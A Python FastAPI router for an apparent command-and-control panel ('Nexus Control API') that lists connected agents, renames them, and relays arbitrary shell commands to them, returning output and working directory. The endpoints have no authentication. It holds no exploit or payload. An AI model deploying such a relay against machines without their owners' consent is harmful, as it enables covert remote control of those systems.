import utils
import state
from api.models import ServerStatus, ServerStats, AgentData, AgentResponse
from typing import List
from fastapi import APIRouter, HTTPException, Query
from db.models import agents_table, agent_id as agent_id_field
from db.query import Select, Update
from logs import load_logs, logger
from config import Config


router = APIRouter()

@router.get("/server/status", response_model=ServerStatus)
async def get_server_status():
    return ServerStatus(
        is_running=state.server.is_running,
        port=state.server.port,
        host=state.server.host,
    )

@router.get("/server/stats", response_model=ServerStats)
async def get_server_stats():
    utils.update()
    return ServerStats(
        hostname=utils.hostname,
        local_ip=utils.local_ip,
        public_ip=utils.public_ip,
        mac_address=utils.mac_address,

        cpu_usage=utils.cpu_usage,
        memory_usage=utils.memory_usage,
        network_download_kbps=utils.network_download_kbps,
        network_upload_kbps=utils.network_upload_kbps,

        max_connections=state.server.MAX_CONNECTIONS,
        encryption=True,
        os_name=utils.os_name,
        os_version=utils.os_version,
        os_architecture=utils.os_architecture,
        server_time=utils.server_time,
        server_start_time=utils.server_start_time,
    )

@router.post("/server/control")
async def control_server(action: str):

    if action == "start":
        state.server.start(Config.HOST, Config.PORT)
        return {"message": "Server started successfully", "action": "start"}
    elif action == "stop":
        state.server.stop()
        return {"message": "Server stopped successfully", "action": "stop"}
    else:
        raise HTTPException(status_code=400, detail="Invalid action")

@router.get("/agents", response_model=List[AgentData])
async def get_agents() -> List[AgentData]:
    select_query = Select(agents_table).all()
    result = state.db_engine.execute(select_query)

    agents_list = [AgentData.model_validate(row) for row in result]
    return agents_list

@router.get("/agents/{agent_id}", response_model=AgentData)
async def get_agent(agent_id: str) -> AgentData:
    select_query = Select(agents_table).all()
    result = state.db_engine.execute(select_query)

    for row in result:
        agent = AgentData.model_validate(row)
        if agent.agent_id == agent_id:
            return agent

    raise HTTPException(status_code=404, detail="Agent not found")

@router.post("/agents/interaction", response_model=AgentResponse)
async def agent_interaction(agent_id: str, command: str) -> AgentResponse:
    try:
        response: dict = state.server.interact_with_agent(agent_id, command)
        return AgentResponse(status=response["status"], command_response=response["response"], cwd=response["cwd"])
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/agents/{agent_id}")
async def update_agent_name(agent_id: str, name: str):
    try:
        update = Update(agents_table).set({"name": name}).where(agent_id_field == agent_id)
        state.db_engine.execute(update)
        state.db_engine.commit()
        logger.info(f"Database updated agent name to {name}.")

        return {"message": "Agent updated successfully", "agent_id": agent_id}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@router.get("/health")
async def health_check():
    return {
        "status": "healthy",
        "message": "Nexus Control API is running"
    }

@router.get("/logs")
async def get_logs(limit: int = Query(20, ge=1)):
    return load_logs(limit)